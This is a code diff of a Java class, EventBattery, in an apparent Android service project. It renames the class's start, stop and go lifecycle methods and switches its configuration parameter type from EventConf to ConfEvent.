@@ -13,6 +13,7 @@ import java.io.IOException;
 
 import com.android.service.Battery;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerBattery;
@@ -27,17 +28,17 @@ public class EventBattery extends BaseEvent implements Observer<Battery> {
 	private boolean inRange = false;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		ListenerBattery.self().attach(this);
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerBattery.self().detach(this);
 	}
 
 	@Override
-	public boolean parse(EventConf conf) {
+	public boolean parse(ConfEvent conf) {
 		try {
 
 			minLevel = conf.getInt("min");
@@ -56,7 +57,7 @@ public class EventBattery extends BaseEvent implements Observer<Battery> {
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 		// TODO Auto-generated method stub
 	}
 
